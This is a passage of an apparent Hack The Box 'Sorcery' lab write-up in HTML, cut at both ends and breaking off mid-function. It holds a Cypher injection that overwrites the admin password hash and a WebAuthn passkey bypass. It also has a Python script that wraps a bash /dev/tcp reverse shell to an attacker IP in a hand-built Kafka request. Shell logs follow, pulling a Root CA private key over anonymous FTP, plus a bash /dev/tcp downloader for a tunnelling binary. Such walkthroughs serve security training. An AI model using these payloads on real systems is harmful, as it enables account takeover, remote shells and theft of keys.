+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;) MATCH (u:User &#123;username:&quot;admin&quot;&#125;) SET u.password=&quot;$argon2id$v=19$m=102400,t=2,p=8$8pO4PluD0Xn8fNOsbHB8Dw$2i3GZbgMxAqlqU/db5Wf7w&quot; //</span><br></pre></td></tr></table></figure></div>
+
+<p>Password is now <code>admin123</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/admin-login.png"
+                      alt="Admin login"
+                ><figcaption>Admin login</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/admin-dash.png"
+                      alt="Admin dashboard"
+                ><figcaption>Admin dashboard</figcaption></figure></p>
+<p>We get back a JWT for admin:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDMzMDY3NX0.luWiaw3ytw0XQXBpKAMuGxjcdAT1yGQwnhIqXnyVUD0</span><br></pre></td></tr></table></figure></div>
+
+<p>But the privileged routes check <code>withPasskey: true</code> on the JWT and refuse us:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/passkey-block.png"
+                      alt="Passkey required"
+                ><figcaption>Passkey required</figcaption></figure></p>
+<h3 id="Bypassing-WebAuthn-with-Chrome-DevTools"><a href="#Bypassing-WebAuthn-with-Chrome-DevTools" class="headerlink" title="Bypassing WebAuthn with Chrome DevTools"></a>Bypassing WebAuthn with Chrome DevTools</h3><p>Since admin doesn’t actually have a registered passkey on the server (the field is empty), we can register <strong>our own</strong> WebAuthn credential using Chrome’s built-in virtual authenticator, then login with it:</p>
+<ol>
+<li>Proxy Chrome through Burp.</li>
+<li><strong>Open Developer Tools</strong>: Press <code>F12</code> or <code>Ctrl+Shift+I</code>, click the 3-dot menu, <code>More tools</code> → <code>WebAuthn</code>, and add a new virtual authenticator with:<ul>
+<li><strong>Protocol</strong>: <code>CTAP2</code></li>
+<li><strong>Transport</strong>: <code>USB</code></li>
+<li><strong>Support Resident Key</strong>: Yes</li>
+<li><strong>User Verification</strong>: Yes</li>
+</ul>
+</li>
+<li>Trigger the “register passkey” flow inside the admin dashboard.</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/webauthn.png"
+                      alt="WebAuthn virtual authenticator"
+                ><figcaption>WebAuthn virtual authenticator</figcaption></figure></p>
+<p>After registering the virtual key, log out and log back in with it. The new JWT now carries <code>withPasskey: true</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/admin-loggedin.png"
+                      alt="Admin logged in with passkey"
+                ><figcaption>Admin logged in with passkey</figcaption></figure></p>
+<h3 id="DNS-Refresh-Endpoint-Discovering-debug"><a href="#DNS-Refresh-Endpoint-Discovering-debug" class="headerlink" title="DNS Refresh Endpoint - Discovering &#x2F;debug"></a>DNS Refresh Endpoint - Discovering &#x2F;debug</h3><p>Inside the admin panel there’s a DNS management page that lets us re-fetch records:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/dns-panel.png"
+                      alt="DNS panel"
+                ><figcaption>DNS panel</figcaption></figure></p>
+<p>Reading the source, the DNS service backend communicates with a Kafka broker over an internal endpoint exposed at <code>/debug</code>, which accepts raw hex-encoded TCP packets and forwards them to Kafka. There’s no auth on the broker once we can hit it, and the <code>update</code> topic ends up shelling out to a script that runs commands. So if we craft a valid Kafka Produce request to the <code>update</code> topic with a reverse-shell payload, we get RCE.</p>
+<h3 id="Kafka-Protocol-Exploitation"><a href="#Kafka-Protocol-Exploitation" class="headerlink" title="Kafka Protocol Exploitation"></a>Kafka Protocol Exploitation</h3><p>Reference: <a class="link"   target="_blank" rel="noopener" href="https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/" >https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def create_produce_request(</span><br><span class="line">    topic, message, correlation_id=1, client_id=&quot;&quot;, partition=0</span><br><span class="line">):</span><br><span class="line">    # Produce API Key=0, Version=0</span><br><span class="line">    header = struct.pack(&quot;&gt;hhI&quot;, 0, 0, correlation_id)</span><br><span class="line">    # clientId (empty string by default)</span><br><span class="line">    header += struct.pack(&quot;&gt;h&quot;, len(client_id)) + client_id.encode()</span><br><span class="line">    # requiredAcks = -1 (all), timeout = 30000ms</span><br><span class="line">    header += struct.pack(&quot;&gt;hI&quot;, -1, 30000)</span><br><span class="line">    # one topic</span><br><span class="line">    header += struct.pack(&quot;&gt;i&quot;, 1)</span><br><span class="line">    # topic name</span><br><span class="line">    header += struct.pack(&quot;&gt;h&quot;, len(topic)) + topic.encode()</span><br><span class="line">    # one partition</span><br><span class="line">    header += struct.pack(&quot;&gt;i&quot;, 1)</span><br><span class="line">    header += struct.pack(&quot;&gt;i&quot;, partition)</span><br><span class="line">    # build the single message</span><br><span class="line">    payload = message.encode()</span><br><span class="line">    key_data = struct.pack(&quot;&gt;i&quot;, -1)  # null key</span><br><span class="line">    value_data = struct.pack(&quot;&gt;i&quot;, len(payload)) + payload</span><br><span class="line">    magic_attr = struct.pack(&quot;BB&quot;, 0, 0)</span><br><span class="line">    msg_body = magic_attr + key_data + value_data</span><br><span class="line">    crc = binascii.crc32(msg_body) &amp; 0xffffffff</span><br><span class="line">    msg_struct = struct.pack(&quot;&gt;I&quot;, crc) + msg_body</span><br><span class="line">    # wrap message in a MessageSet (offset=0)</span><br><span class="line">    message_set = struct.pack(&quot;&gt;qI&quot;, 0, len(msg_struct)) + msg_struct</span><br><span class="line">    # prepend MessageSet length</span><br><span class="line">    header += struct.pack(&quot;&gt;i&quot;, len(message_set)) + message_set</span><br><span class="line">    # finally, prepend the total request size</span><br><span class="line">    full_frame = struct.pack(&quot;&gt;i&quot;, len(header)) + header</span><br><span class="line">    return binascii.hexlify(full_frame).decode()</span><br><span class="line"></span><br><span class="line"># --- Configure reverse shell payload ---</span><br><span class="line">attacker_ip = &quot;10.10.16.19&quot;</span><br><span class="line">attacker_port = 4444</span><br><span class="line">payload = f&quot;bash -c &#x27;/bin/sh -i &gt;&amp; /dev/tcp/&#123;attacker_ip&#125;/&#123;attacker_port&#125; 0&gt;&amp;1&#x27;&quot;</span><br><span class="line"></span><br><span class="line"># --- Create Kafka Produce request ---</span><br><span class="line">hex_request = create_produce_request(&quot;update&quot;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;Hex-encoded Kafka Produce request for TCP reverse shell:\n&quot;)</span><br><span class="line">print(hex_request)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Take the generated hex, paste it into <code>/debug</code>, and start a listener. We catch a shell as the <code>user</code> account inside the DNS container:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/kafka-shell.png"
+                      alt="Shell from Kafka exploit"
+                ><figcaption>Shell from Kafka exploit</figcaption></figure></p>
+<h2 id="Pivoting-From-the-DNS-Container"><a href="#Pivoting-From-the-DNS-Container" class="headerlink" title="Pivoting From the DNS Container"></a>Pivoting From the DNS Container</h2><p>The shell drops us inside a Docker container on the <code>172.19.0.0/16</code> network. There’s a <code>/dashboard/blog</code> route on the main app that we’ll need later, but first we enumerate the internal services.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@7bfb70ee5b9c:/$ getent hosts ftp</span><br><span class="line">getent hosts ftp</span><br><span class="line">172.19.0.4      ftp</span><br><span class="line">user@7bfb70ee5b9c:/$ </span><br></pre></td></tr></table></figure></div>
+
+<p>There’s an internal FTP server. After a container restart the IP shifts to <code>.3</code>; either way it accepts anonymous login. Inside <code>/pub</code> are the <strong>Sorcery Root CA</strong> key and certificate:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">user@7bfb70ee5b9c:/dns$ getent hosts ftp</span><br><span class="line">getent hosts ftp</span><br><span class="line">172.19.0.3      ftp</span><br><span class="line">user@7bfb70ee5b9c:/dns$ python3 -c &quot;import ftplib; f=ftplib.FTP(&#x27;172.19.0.3&#x27;); f.login(); f.cwd(&#x27;pub&#x27;); f.retrbinary(&#x27;RETR RootCA.key&#x27;, open(&#x27;RootCA.key&#x27;,&#x27;wb&#x27;).write)&quot;</span><br><span class="line">&lt;(&#x27;RETR RootCA.key&#x27;, open(&#x27;RootCA.key&#x27;,&#x27;wb&#x27;).write)&quot;</span><br><span class="line">user@7bfb70ee5b9c:/dns$ ls</span><br><span class="line">ls</span><br><span class="line">RootCA.key  convert.sh  entries  hosts</span><br><span class="line">user@7bfb70ee5b9c:/dns$ </span><br><span class="line">user@7bfb70ee5b9c:/dns$ cat RootCA.key</span><br><span class="line">cat RootCA.key</span><br><span class="line">-----BEGIN ENCRYPTED PRIVATE KEY-----</span><br><span class="line">MIIJrTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI4I3iO1Zn5XkCAggA</span><br><span class="line">MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBDcZKASBSs0bWpLaNHAilbOBIIJ</span><br><span class="line">UMKP7fry6hri3ciSyBFya9hiU2naC2IA/wANIehsxUbXTj4xa7SsHRTvBd6uue35</span><br><span class="line">kJSGijQLzXhXzqoapBcP1k0pt5vXqK37EWLPubkAZ3jZw56Q85J47Pd+Vb15Hl/W</span><br><span class="line">5wS1aAS/IP01rHVmOMIz+0K49m9jq1YJzK4xt8Q13Yx/O8jwY5AD1rzngx9K6x01</span><br><span class="line">H3IlJgpM04RC1jM2TAh4dAFJG8H6LtMp5rKNq9hDOk2sqcJwUdvzQ7eZy8apbEyZ</span><br><span class="line">HraM3XDaVM9o/kjsYJhFhYum/UgcMOoBTM3bGodRqVtP/VmbziuU6ec6cxfoSQuv</span><br><span class="line">h8yq6P0eeUvDB88WaTZ9+Hacft40zeuObLFEOz2004yZXjsIdu3sHUK15ssH1yIP</span><br><span class="line">ZScJ7D5cJNw+whKGNXbIyq1hjphS7eEpGm7AfJRy1MeBXoKe/Nmp2lwH/klqxqx8</span><br><span class="line">HsVetI6AVeRBaZHy6o7SJ/y0nTvdp9jXCcPCnSGbTG0DQ/DvRRuJAk3F0bIRXC/7</span><br><span class="line">SIdkp7DQEn8079K0hJTSzoH/ERLphs3ZPFzQKfmrGtXOmhZda5oy9WVFYncWBBty</span><br><span class="line">zQq3aXbbbVSIyzwoAQ+Lj8tYrZQYRDYCI4Tn/GYYJoNCBkH4Yybg6H6iBW1TPujW</span><br><span class="line">DCfuY3X6zvHUr9WNkpbFuGJyK5Nalpd/aycIZmyfaP5g5xg5g8orCif3IpcMd6pX</span><br><span class="line">E1plAPyioFkNlOHJXq3UOcwLYH+qeMk9alqiZ5jFDaaH1/oaHdKiH0ZxKzGTlv6S</span><br><span class="line">OTsFME5edKL7mhQSKoAVRIsMIiGsksa8JJIqEC2rdhDXGPgL+OHyXSVd+YDFnL7L</span><br><span class="line">y+egJI20xzDsbRPDD8NNigOe+KbhBoDCnHW3uX9pxefguWL0jRbdayXstHjSmRmw</span><br><span class="line">CioIoq650tALuo4+9Je2AC/6281abMcBYEqyuIhPPQDSfMgRmojtjxlmGYaTTIrf</span><br><span class="line">bDC+aHxypF3yhULVGkuKwZErR3RvI3TeGvdkDSCO1Q38K23jtPDMvRLlpkosEJGq</span><br><span class="line">XC94EX7r4rQfWcN/fKrVY0DzZ6YNM09vb6oOXLDgZPxbVjDeyhAdjVbRng5Haasa</span><br><span class="line">u6xsSPAQ9RZEsNRLd9xJO6T9RNmjwABF+YQOGCxY37mU6QaVeHwJq/LGwChigyaT</span><br><span class="line">TggDDV/JijJiZu1+XMe/agIV6LaYGO5lmdF0lnkARR4C8S/4uY34yv4GpPePO92d</span><br><span class="line">ZPLhcxVC2h8ZhbC/h6QYHfphFf97HMuBx4vD9+CW1vh151MAYJ3LJKp7GAeQXfLd</span><br><span class="line">j9nQ0CWVJSYADXDkAos2iwfF6k1ePgND2aaYGKvC2VFXa3ZUM2Iu/DiFUonpLtBV</span><br><span class="line">7yqp9bW0vAis4G+olpAAwrKgAkg2B+oYCVj+w6UeNb0a0zmg5Oa0waAkmQ+DNnLn</span><br><span class="line">UjMdaCf8T3eSVq9WM0K+daG37hzRG2fQpt8H7Asw5XNXGMA7Wu0G5TqRUjP4Hz9Q</span><br><span class="line">Njw2EyYP65dRHZo6klNzHFHHTp3cT1l8QQbtU3dZ5RoES/VV2W6X5WcThj7hSuUz</span><br><span class="line">62UbAhfKKWk0B6Cg/lepXGxA3nX4FrtTRsto4WkqQjFEmTxjwiX4kVLqRTyhYu4T</span><br><span class="line">AyiRP25udF4B/zwsqaLEHKCg5L0NNFuqi0Fh6bjMXnzn4xeU9nwPhxzTUNYYjaBC</span><br><span class="line">Ot7MGyB2bEvZvWeg/XYgdCCW0LmtkgA/dN8NLAcz/97lTTZVQDqRwL+8e22Z/CCt</span><br><span class="line">CUUDpFh5DsDXa1fx3bv5hodCRVILnLLvecB+i5ZA3cXeQm6poTFvZiCOwt+wPGvV</span><br><span class="line">/PQ52Ah8AdbZ/d/6KYRbirvzFOX6M5/pVzN7eUIlcJNovPzBG5FVw37pehCNDY7/</span><br><span class="line">2kS22IBa2EWE3+Evktus9vl88kz6jc8Z/HmgMmTiJ0iXaoRVaqgRoG9SN4IImayq</span><br><span class="line">PCIS0HGEdn0tLE4VFh3h6BF/T+4G9bC9Lxg6YxjgdaT7IU6wvs+hGpFPXmppolnr</span><br><span class="line">1V8dtZAcnKCtBPLR6XLZaSPKmdA0+IfEA/eQi1FWbt//Ja9CAkzFiaiRaGmFW7XN</span><br><span class="line">XXeuAbXOiPqmXWGR0mLvvmXiTSI7atx3MmlMefmZVoSOg2MWKvJo8btQivq1abOb</span><br><span class="line">0UsSxud6ZB0Q9EzFs66ydBjpf3uqVTsVBulK5HDdrfGBxXTLwaTM1SbJ5WuzVLLn</span><br><span class="line">snXuLelt8R5w9VNgKFC6BSjMeeEFWRh1srXKg1MZPAi2Hq0oQYiyR3nikOHmri++</span><br><span class="line">EqUC/EW4dvhOuTq4PU6HISzxrfxXhxa8dxZQsx/jBGBCskxXfAmwpyNA5u32OKHc</span><br><span class="line">99US9FhFpynxH9O4ZmgiuNEGkZjpowAa/Q9vJc0/qnks3lIKA0sSBZXfNwcDnLKl</span><br><span class="line">KZjtzmkCmBEgqgAZf9oLa9ShPSzeVnUAraW8qeYzQMKDyX3BFfbKPrpaaRuxxCwp</span><br><span class="line">iu99Np0zJJVtdScyXY/R5rRRE7Y75mFceJgd4uXLlZ2e4q7+nHp/C1SUs3mn9gbP</span><br><span class="line">41y5tPV1YGGM6fK4ZJYWhTnNva7Q+qnsPoBP/IHCJO8R4cQwIYI/9zYuDSNNUCkA</span><br><span class="line">ud/6gNVOC4NDNSr1gi+S4AaLbe0nt28bR1LgyUMz/rh72SddhWlK7YMzP77IW4vm</span><br><span class="line">ZM3+SshJ6JjCKXXOHXhj4uAJ3u0QWefmHrsPqbYKiflYjopY9beWT/YUTbEvWiGQ</span><br><span class="line">g5Ef8G8Ka96AnlGhlmUnTPHIyPt5mhVAj6ZOG1wLijK2/nTm2PA8j5mckROlkhy2</span><br><span class="line">CkM621GiX8p9Qa08VIgHDVkZGoRGgMpHX3cWuUgzH4ftk4wH8JOBshQiqMd6Gei/</span><br><span class="line">sDdgySWJVF0xmfqQL3PxvEzqaIK7FQmDV1cbJ8I211+bw0UAWyYrwZWAiRD+GZqn</span><br><span class="line">bc6q75ixV3z7Bhuzu1vI3G6orYJQfjlZWNjJqJ0vx4vjFzZErSDIYnOHMd218eUS</span><br><span class="line">bRFlsZidl7jh0+qhs2tiQ8V7R8K62a2KtYZAojJSIiPB1/7ZXaWmcTkgoCmPinc+</span><br><span class="line">jseBaA+DvhR/PgOS6qIFtU7tG9knb/tbee4Rq1ltGkGwO8lWQpgWCN8dSTuy5AcS</span><br><span class="line">lNEZyhxuFS4MEfh1Ss5KLFC6Z6rhg8OoN7SwEgGzLwyZOTBpZ6dMOrg3ua78SVcm</span><br><span class="line">in0CLCi4ycZeT+dxcf82nMdhSzrwDckjuPRoppXZffgf</span><br><span class="line">-----END ENCRYPTED PRIVATE KEY-----</span><br><span class="line">user@7bfb70ee5b9c:/dns$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user@7bfb70ee5b9c:/dns$ python3 -c &quot;import ftplib; f=ftplib.FTP(&#x27;172.19.0.3&#x27;); f.login(); f.cwd(&#x27;pub&#x27;); f.retrbinary(&#x27;RETR RootCA.crt&#x27;, open(&#x27;RootCA.crt&#x27;,&#x27;wb&#x27;).write)&quot;</span><br><span class="line">&lt;(&#x27;RETR RootCA.crt&#x27;, open(&#x27;RootCA.crt&#x27;,&#x27;wb&#x27;).write)&quot;</span><br><span class="line">user@7bfb70ee5b9c:/dns$ ls</span><br><span class="line">ls</span><br><span class="line">RootCA.crt  RootCA.key  convert.sh  entries  hosts</span><br><span class="line">user@7bfb70ee5b9c:/dns$ cat RootCA.crt</span><br><span class="line">cat RootCA.crt</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIFFzCCAv+gAwIBAgIUVZjiESnop+nNu9rkWlbXORjlrc0wDQYJKoZIhvcNAQEL</span><br><span class="line">BQAwGjEYMBYGA1UEAwwPU29yY2VyeSBSb290IENBMCAXDTI0MTAzMTAyMDkwOFoY</span><br><span class="line">DzIyOTgwODE2MDIwOTA4WjAaMRgwFgYDVQQDDA9Tb3JjZXJ5IFJvb3QgQ0EwggIi</span><br><span class="line">MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCN/ViSM+ZkeuX17l4GF+0GTcfO</span><br><span class="line">0HX98yvnA5+MQ+TvzKuEHUxkmlL/28xwtIzT/ejB0sKcr7T733kiiy2PMsIbywzM</span><br><span class="line">rJrlLBCAekb1hdqXXb0CcNEZrVQGZnU2h9iFBpsexXvh+oUPszrBdxOAITI6HPio</span><br><span class="line">p/IjTfyt1QNtQJTNcB7ernYVb4lH043QAgS6M9CcYXev7pDarynbOZvEe5aS42NY</span><br><span class="line">+MtEg643k4JM1T4NQGKHkGhWO/73OzCero2Rpyz/Wo7fVnpVhrwNdexiStbCUtqQ</span><br><span class="line">qDKaieeigjZtpQKNLC5tC6fWrN3dSWT+diyQ+sQfrVYQQc8oWPbQHAysaGP6KGW+</span><br><span class="line">V51Ai5z0vshG5W36GEHAmP8opvvVzPrS4Y9L6L1rMuIHwsCmTz/koBf8pJJ0sURB</span><br><span class="line">1edux+j+Wzp9B8umONaKMOvG1GejVGW8UAhmVhK3ebr/Vto48J5svgtJO9d/QmZd</span><br><span class="line">XlKsIdvaRUzSHTQfflQ7k1G9AlNdp3PNXW4YrlWlP+b4aSSyet6EyQR1KFmipGu2</span><br><span class="line">ozbgMxYQ0nb4UwkCar3QJ3funYBjTdJtV5fHSUzmTO0BRH2jFi0VaDtIMBpmYQFo</span><br><span class="line">kUJZSA5PW+ujDLoAQQDjMd5M7NJi4dWPdbAL9zCL7I41DUyk2hPuYVocd7SW1pTU</span><br><span class="line">7bER1p5kKYlhwhnAHQIDAQABo1MwUTAdBgNVHQ4EFgQUjkNkC2vZwFux5uHSWfP+</span><br><span class="line">U1HQbMkwHwYDVR0jBBgwFoAUjkNkC2vZwFux5uHSWfP+U1HQbMkwDwYDVR0TAQH/</span><br><span class="line">BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAZHTimjRmsbRIlq2wIcNXnaFHtdk4</span><br><span class="line">kvXcgHg3G9kPk27QKTYnAFicAmFDJkWdwMdB9eAhyurcvpWvP8Z+WFrQaOAUFZje</span><br><span class="line">kY/CB+1/pouYIxw9IpTanl+hN0Ca4C74fXUfk3am21ntl7S/OomtZDISvaPALr1E</span><br><span class="line">ejE3MiEBDg+V03tWA1fLtSX039rh2trjn5Jgg498jlumTV+62Tg9OoAS1liCPzLA</span><br><span class="line">aps6odiYVnjuqhpfHRHoifIn1enadbLpKb7C58iw/KnuTzsQ8suweWbRsSkBKXQo</span><br><span class="line">b8ozrF/MaxEk3dzakfV+yEsXIhmbDrPa0LGdAARXIPeEIRyl3qk7N4lmJVCt/94K</span><br><span class="line">tyypoNIhqRvKLs+vGQHrGJjKezzm4ygZ0qO9z6QqliYobcRCioxb+Ml3qPGtggws</span><br><span class="line">xrFDATMN5r5TNbTkm1y2apeB5fpaHyQLWZzbm7acZhBMVZ4wI/QPV2o+bwZeKCXH</span><br><span class="line">frakt9Nz8KCzlulUt/C9D0rnFoTDJnG/focvWewuW9bKQqJLmSj6L0/Vvc2a+lWc</span><br><span class="line">7kDfSUCHvTYR1OrwggA1HJ48Eu/NwNERvxXm395B9hCRgsji3jLEaUOgPuq1hrgb</span><br><span class="line">u5GqrPn8BMpsLs92Y/pMUtWbF3DcM8jn+hjL3owallYj2E9Md6mQ5pfI1+PiTvf/</span><br><span class="line">udz+k7mYqIcCjsE=</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">user@7bfb70ee5b9c:/dns$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Owning the Root CA’s private key means we can mint TLS certificates for any internal subdomain that the host trusts.</p>
+<h3 id="Pulling-chisel-In-Without-curl-wget"><a href="#Pulling-chisel-In-Without-curl-wget" class="headerlink" title="Pulling chisel In Without curl&#x2F;wget"></a>Pulling chisel In Without curl&#x2F;wget</h3><p>The container has no <code>curl</code>, <code>wget</code>, or <code>nc</code>, so we use a pure-bash <code>/dev/tcp</code> reimplementation to fetch a chisel binary off our HTTP server:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">user@7bfb70ee5b9c:/dns$ function __curl() &#123;</span><br><span class="line">  read -r proto server path &lt;&lt;&lt;&quot;$(printf &#x27;%s&#x27; &quot;$&#123;1//// &#125;&quot;)&quot;</span><br><span class="line">  if [ &quot;$proto&quot; != &quot;http:&quot; ]; then</span><br><span class="line">    printf &gt;&amp;2 &quot;sorry, %s supports only http\n&quot; &quot;$&#123;FUNCNAME[0]&#125;&quot;</span><br><span class="line">    return 1</span><br><span class="line">  fi</span><br><span class="line">  DOC=/$&#123;path// //&#125;</span><br><span class="line">  HOST=$&#123;server//:&#125;</span><br><span class="line">  PORT=$&#123;server//:&#125;</span><br><span class="line">  [ &quot;$&#123;HOST&#125;&quot; = &quot;$&#123;PORT&#125;&quot; ] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;&quot;/dev/tcp/$&#123;HOST&#125;/$PORT&quot;</span><br><span class="line">  printf &#x27;GET %s HTTP/1.0\r\nHost: %s\r\n\r\n&#x27; &quot;$&#123;DOC&#125;&quot; &quot;$&#123;HOST&#125;&quot; &gt;&amp;3</span><br><span class="line">  (while read -r line; do</span><br><span class="line">   [ &quot;$line&quot; = $&#x27;\r&#x27; ] &amp;&amp; break</span><br><span class="line">  done &amp;&amp; cat) &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br><span class="line">function __curl() &#123;</span><br><span class="line">&gt;   read -r proto server path &lt;&lt;&lt;&quot;$(printf &#x27;%s&#x27; &quot;$&#123;1//// &#125;&quot;)&quot;</span><br><span class="line">&gt;   if [ &quot;$proto&quot; != &quot;http:&quot; ]; then</span><br><span class="line">&gt;     printf &gt;&amp;2 &quot;sorry, %s supports only http\n&quot; &quot;$&#123;FUNCNAME[0]&#125;&quot;</span><br><span class="line">&gt;     return 1</span><br><span class="line">&gt;   fi</span><br><span class="line">&gt;   DOC=/$&#123;path// //&#125;</span><br><span class="line">&gt;   HOST=$&#123;server//:&#125;</span><br><span class="line">&gt;   PORT=$&#123;server//:&#125;</span><br><span class="line">&gt;   [ &quot;$&#123;HOST&#125;&quot; = 